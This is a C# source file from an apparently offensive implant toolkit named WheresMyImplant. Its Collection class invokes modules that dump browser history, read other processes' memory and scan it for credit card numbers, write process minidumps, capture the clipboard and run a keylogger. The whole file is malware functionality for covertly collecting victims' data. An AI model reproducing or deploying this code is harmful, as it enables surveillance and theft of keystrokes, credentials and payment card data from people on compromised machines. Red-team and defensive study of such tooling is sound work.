using System;
using System.Linq;

namespace WheresMyImplant
{
    public sealed class Collection
    {
        //Checked
        public static void DumpBrowserHistory()
        {
            try
            {
                BrowserHistory history = new BrowserHistory();
                history.InternetExplorer();
                history.Firefox();
                history.Chrome();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void ReadProcessMemory(String processId)
        {
            try
            {
                if (!Int32.TryParse(processId, out Int32 pid))
                {
                    System.Diagnostics.Process[] process = System.Diagnostics.Process.GetProcessesByName(processId);
                    if (0 < process.Length)
                    {
                        pid = process.First().Id;
                    }
                    else
                    {
                        Console.WriteLine("[-] Unable to parse {0}", processId);
                        return;
                    }
                }

                ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
                if (!readProcessMemory.OpenProcess())
                    Console.WriteLine("[-] Unable to open process", pid);

                readProcessMemory.ReadProcesMemory();
                Console.WriteLine("\n-----\n");
                CheckCCNumber(readProcessMemory.GetPrintableMemory());
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void CheckCCNumber(String input)
        {
            foreach (String number in CheckCreditCard.CheckString(input))
            {
                Console.WriteLine(number);
            }
        }

        //Checked
        public static void MiniDump(String processId, String fileName)
        {
            try
            {
                if (!Int32.TryParse(processId, out Int32 pid))
                {
                    System.Diagnostics.Process[] process = System.Diagnostics.Process.GetProcessesByName(processId);
                    if (0 < process.Length)
                    {
                        pid = process.First().Id;
                    }
                    else
                    {
                        Console.WriteLine("[-] Unable to parse {0}", processId);
                        return;
                    }
                }

                MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
                miniDump.CreateMiniDump((UInt32)pid, fileName);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void Clipboard()
        {
            try
            {
                ClipboardManaged clipboard = new ClipboardManaged();
                clipboard.Execute();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void Keylogger()
        {
            try
            {
                KeyLogger clipboard = new KeyLogger();
                clipboard.Execute();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }
    }
}
